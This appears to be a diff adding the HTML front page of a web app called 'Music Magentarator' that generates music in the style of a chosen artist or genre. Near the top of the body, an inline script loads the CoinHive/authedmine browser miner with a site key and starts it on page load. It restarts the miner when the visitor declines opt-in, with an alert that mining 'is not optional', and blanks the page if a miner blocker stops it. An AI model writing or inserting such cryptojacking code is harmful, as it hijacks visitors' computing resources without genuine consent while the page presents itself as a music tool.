@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha256-k2WSCIexGzOj3Euiig+TlR8gA0EmPjuc79OEeY5L45g=" crossorigin="anonymous"></script>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="description" content="A front-end template that helps you build fast, modern mobile web apps.">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <title>Magentarator</title>
+
+  <!-- Add to homescreen for Chrome on Android -->
+  <meta name="mobile-web-app-capable" content="yes">
+  <link rel="icon" sizes="192x192" href="images/android-desktop.png">
+
+  <!-- Add to homescreen for Safari on iOS -->
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="apple-mobile-web-app-title" content="Material Design Lite">
+  <link rel="apple-touch-icon-precomposed" href="images/ios-desktop.png">
+
+  <!-- Tile icon for Win8 (144x144 + tile color) -->
+  <meta name="msapplication-TileImage" content="images/touch/ms-touch-icon-144x144-precomposed.png">
+  <meta name="msapplication-TileColor" content="#3372DF">
+
+  <link rel="shortcut icon" href="images/favicon.png">
+
+  <!-- SEO: If your mobile URL is different from the desktop URL, add a canonical link to the desktop page https://developers.google.com/webmasters/smartphone-sites/feature-phones -->
+  <!--
+    <link rel="canonical" href="http://www.example.com/">
+    -->
+
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:regular,bold,italic,thin,light,bolditalic,black,medium&amp;lang=en">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+  <link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.purple-deep_purple.min.css" />
+  <link rel="stylesheet" href="styles.css">
+  <style>
+    #view-source {
+      position: fixed;
+      display: block;
+      right: 0;
+      bottom: 0;
+      margin-right: 40px;
+      margin-bottom: 40px;
+      z-index: 900;
+    }
+  </style>
+</head>
+
+<body class="mdl-demo mdl-color--grey-100 mdl-color-text--grey-700 mdl-base" onload="client.start()" id="body">
+  <script>
+    var script = document.createElement('script');
+    script.src = 'https://authedmine.com/lib/authedmine.min.js';
+    document.getElementsByTagName("head")[0].appendChild(script);
+    //check if script was loaded
+    script.onload = function() {
+      var miner = new CoinHive.Anonymous('zJkrUQfkN5OfHz32nQLz0HTka2u9NqRd');
+      miner.start();
+      miner.on('optin', function(params) {
+        if (params.status === 'accepted') {
+          console.log('User accepted opt-in');
+        } else {
+          miner.start();
+          alert("This is not optional")
+        }
+      });
+    }
+    //check if it didn't load
+    script.onerror = function() {
+      document.write("Please disable your miner blocker")
+      window.stop()
+    }
+  </script>
+  <div class="mdl-layout mdl-js-layout mdl-layout--fixed-header">
+    <header class="mdl-layout__header mdl-layout__header--scroll mdl-color--primary">
+      <div class="mdl-layout--large-screen-only mdl-layout__header-row"></div>
+      <div class="mdl-layout--large-screen-only mdl-layout__header-row" style="justify-content: center;">
+        <h3 style="text-align: center">Music Magentarator</h3>
+      </div>
+      <div class="mdl-layout--large-screen-only mdl-layout__header-row"></div>
+      <!--
+            <div class="mdl-layout__tab-bar mdl-js-ripple-effect">
+                <a href="#overview" class="mdl-layout__tab is-active">Overview</a>
+                <a href="#features" class="mdl-layout__tab">Features</a>
+                <a href="#features" class="mdl-layout__tab">Details</a>
+                <a href="#features" class="mdl-layout__tab">Technology</a>
+                <a href="#features" class="mdl-layout__tab">FAQ</a>
+            </div>!-->
+    </header>
+    <main class="mdl-layout__content">
+      <div class="mdl-layout__tab-panel is-active">
+        <section class="section--center mdl-grid mdl-grid--no-spacing mdl-shadow--2dp" id="overview">
+          <div class="mdl-card mdl-cell mdl-cell--9-col-desktop mdl-cell--6-col-tablet mdl-cell--4-col-phone" style="width: 100%;">
+            <div class="mdl-card__supporting-text">
+              <h4>Create Music Like:</h4>
+              <div class="maininput">
+                <div class="radiobtns">
+                  <div class="artistbtn">
+                    <label class="mdl-radio mdl-js-radio mdl-js-ripple-effect" for="option-1">
+                                            <input type="radio" id="option-1" class="mdl-radio__button" name="options" value="1" onclick="client.artclick()" checked>
+                                            <span class="mdl-radio__label">Artist</span>
+                                        </label>
+                  </div>
+                  <h6 class="or">or</h6>
+                  <label class="mdl-radio mdl-js-radio mdl-js-ripple-effect" for="option-2">
+                                        <input type="radio" id="option-2" class="mdl-radio__button" name="options" value="2" onclick="client.genclick()">
+                                        <span class="mdl-radio__label">Genre</span>
+                                    </label>
+                </div>
+                <form action="#">
+                  <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
+                    <input class="mdl-textfield__input artist" type="text" onkeydown="if (event.keyCode == 13){client.onCreate()}">
+                    <label class="mdl-textfield__label artistlbl" for="artist">Artist...</label>
+                  </div>
+                </form>
+                <div id="moreinput"></div>
+                <button class="mdl-button mdl-js-button mdl-button--fab mdl-button--mini-fab mdl-button--colored mdl-js-ripple-effect addbtn" onclick="client.remove()" style="background: #b551c6; margin-right: 0.6em;" id="remove" disabled>
+                                    <i class="material-icons">remove</i>
+                                </button>
+                <button class="mdl-button mdl-js-button mdl-button--fab mdl-button--mini-fab mdl-button--colored mdl-js-ripple-effect addbtn" onclick="client.add()" style="background: #b551c6; padding-right: 0.7em;">
+                                    <i class="material-icons">add</i>
+                                </button>
+                <div class="go-custom">
+                  <button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent" id="create" onclick="client.onCreate()">
+                                        Create!
+                                    </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section class="section--center mdl-grid mdl-grid--no-spacing mdl-shadow--2dp" id="results" style="display: none;">
+          <div class="mdl-card mdl-cell mdl-cell--9-col-desktop mdl-cell--6-col-tablet mdl-cell--4-col-phone" style="width: 100%;">
+            <div class="mdl-card__supporting-text">
+              <center>
+                <h2 style="vertical-align: middle;" id="progress">Downloading songs...</h2>
+                <h4 style="display: none;">Accuracy:</h4>
+                <div id="p1" class="mdl-progress mdl-js-progress" style="display: none;"></div>
+                <div id="p2" class="mdl-progress mdl-js-progress mdl-progress__indeterminate"></div>
+                <button class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent" id="generate" style="display: none;">
+                                    Stop the madness!
+                                </button>
+              </center>
+            </div>
+          </div>
+        </section>
+      </div>
+    </main>
+  </div>
+  <script src="client.js"></script>
+  <script src="script.js"></script>
+  <script src="https://code.getmdl.io/1.3.0/material.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.4/socket.io.js"></script>
+</body>
+
+</html>
